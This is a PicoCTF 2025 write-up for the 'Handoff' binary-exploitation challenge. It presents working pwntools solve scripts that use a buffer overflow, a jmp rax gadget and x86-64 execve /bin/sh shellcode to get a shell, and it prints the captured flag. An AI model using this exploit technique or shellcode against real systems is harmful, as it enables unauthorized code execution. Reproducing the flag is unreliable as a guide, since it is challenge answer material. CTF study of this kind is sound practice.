---
title: Handoff
author: bytebrew
layout: writeup
category: PicoCTF-2025
chall_description:
points: 400
solves: 0
tags: Binary-Exploitation
date: 2025-03-09
comments: false
---

No description, no hints, very boring :(

---

# Initial Analysis
In the provided source we are given 3 main pieces of functionality: creating a recipient in an array (max of 32 bytes), creating a message for the array (we will not use this), and giving feedback (max of 32 bytes, vulnerable to a buffer overflow). The protections are pretty much non-existent in the compiled binary, but the stack addresses are randomized so we can't just jump to a known address in the stack.
# Obtaining Code Execution
When debugging with gdb, I found the following to occur when I trigger a buffer overflow:
```c
$rax   : 0x00007fffe8752544  →  0x0031313131313131 ("1111111"?)
$rbx   : 0x00007fffe8752688  →  0x00007fffe8752f22  →  "/mnt/share/handoff"
$rcx   : 0x00007f2b5e82da21  →  0x4f77fffff0003d48 ("H="?)
$rdx   : 0xfbad2288        
$rsp   : 0x00007fffe8752558  →  "11111111\n"
$rbp   : 0x3131313131313131 ("11111111"?)
$rsi   : 0x00000000231e52a1  →  "111111111111111111111111111\n"
$rdi   : 0x00007f2b5e90b720  →  0x0000000000000000
$rip   : 0x000000000040140e  →  <vuln+01e5> ret 
$r8    : 0x00000000231e52bd  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x1               
$r13   : 0x0               
$r14   : 0x00007f2b5e958000  →  0x00007f2b5e9592e0  →  0x0000000000000000
$r15   : 0x0
```
`rax` points to our input, which is executable. So, we can just jump to rax using the binary itself. Using cutter we can search for this gadget and find `jmp rax` at `0x40116c`.
```python
from pwn import *
r = process(elf.path)
r.sendline(b'3') # Select the 3rd option, exit and leave feedback
payload = b'\xeb\xfe'*int((20)/2) # basically a 2 byte loop, never exits, 20 bytes is the size before the RIP overwrite
payload += p64(4198764) # Address of jmp rax
print(len(payload))
r.sendline(payload)
r.interactive()
```
We can see that this does work, but now we have to achieve a shell.
# Exploitation, For Real This Time
Breaking at `0x4012f3`, we can intercept the first argument which will be the address of where the name is stored. The value is `0x7ffdd814b3e0` (will change if ran again). Than we can break at `0x4013e8` the exit function's fgets. The value stored there is `0x7ffdd814b6b4`. The offset is 724 bytes, so we can use the relative jump to jump 724 bytes back. After some tweaking the offset is actually 717 (idk why) and we have to pad our shell code. Finally, we have our solve script:
```python
from pwn import *
elf = context.binary = ELF('./handoff')

#r = remote('shape-facility.picoctf.net', 64512)
r = process(elf.path)

payload = b'1\n' # Add name 
payload += b'\x90\x90\x90\x90\x90\x90\x90\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05\n' # Add shellcode /bin/sh
payload += b'3\n' # Exit
payload += b'\xe9\x2e\xfd\xff\xff' + b'0' * 15 # Jump to shellcode
payload += p64(4198764) # Return address, points to jmp rax

r.sendline(payload)
r.interactive()
```
After making sure it works locally, we can test on the server:
```
[*] '/home/h/Downloads/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to shape-facility.picoctf.net on port 53879: Done
[*] Switching to interactive mode
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
$ ls
flag.txt
handoff
start.sh
$ cat flag.txt
picoCTF{p1v0ted_ftw_17db5315}
```
Based off the flag, this was an unintended solve!
